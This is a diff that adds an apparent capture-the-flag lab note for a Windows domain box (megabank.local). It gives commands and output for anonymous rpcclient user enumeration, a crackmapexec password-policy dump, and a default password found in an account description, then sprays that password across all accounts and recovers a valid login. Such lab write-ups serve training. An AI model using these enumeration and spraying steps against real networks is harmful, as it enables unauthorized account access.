@@ -1,0 +1,41 @@
+smbclient anonymous login enabled. SMB1 disabled.
+
+rpcclient allows null authentication. Can enumerate users (userenum.txt):
+rpcclient -U "" -N 10.10.10.169
+
+run awk on file to get user list:
+=================================== 
+awk -F']' '{print $2}' userenum.txt | awk -F'[' '{print $1}' > user.txt
+
+dumped password policy with crackmapexec:
+===========================================
+cme smb --pass-pol 10.10.10.169
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [+] Dumping password info for domain: MEGABANK
+SMB         10.10.10.169    445    RESOLUTE         Minimum password length: 7
+SMB         10.10.10.169    445    RESOLUTE         Password history length: 24
+SMB         10.10.10.169    445    RESOLUTE         Maximum password age: Not Set
+SMB         10.10.10.169    445    RESOLUTE         
+SMB         10.10.10.169    445    RESOLUTE         Password Complexity Flags: 000000
+SMB         10.10.10.169    445    RESOLUTE         	Domain Refuse Password Change: 0
+SMB         10.10.10.169    445    RESOLUTE         	Domain Password Store Cleartext: 0
+SMB         10.10.10.169    445    RESOLUTE         	Domain Password Lockout Admins: 0
+SMB         10.10.10.169    445    RESOLUTE         	Domain Password No Clear Change: 0
+SMB         10.10.10.169    445    RESOLUTE         	Domain Password No Anon Change: 0
+SMB         10.10.10.169    445    RESOLUTE         	Domain Password Complex: 0
+SMB         10.10.10.169    445    RESOLUTE         
+SMB         10.10.10.169    445    RESOLUTE         Minimum password age: 1 day 4 minutes 
+SMB         10.10.10.169    445    RESOLUTE         Reset Account Lockout Counter: 30 minutes 
+SMB         10.10.10.169    445    RESOLUTE         Locked Account Duration: 30 minutes 
+SMB         10.10.10.169    445    RESOLUTE         Account Lockout Threshold: None
+SMB         10.10.10.169    445    RESOLUTE         Forced Log off Time: Not Set
+
+use rpcclient to dump displayinfo using "querydispinfo"
+see potential default password ->
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
+
+Ran CME to try default pass against all accts enumerated:
+cme smb 10.10.10.169 -u users.txt -p 'Welcome123!'
+>
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+
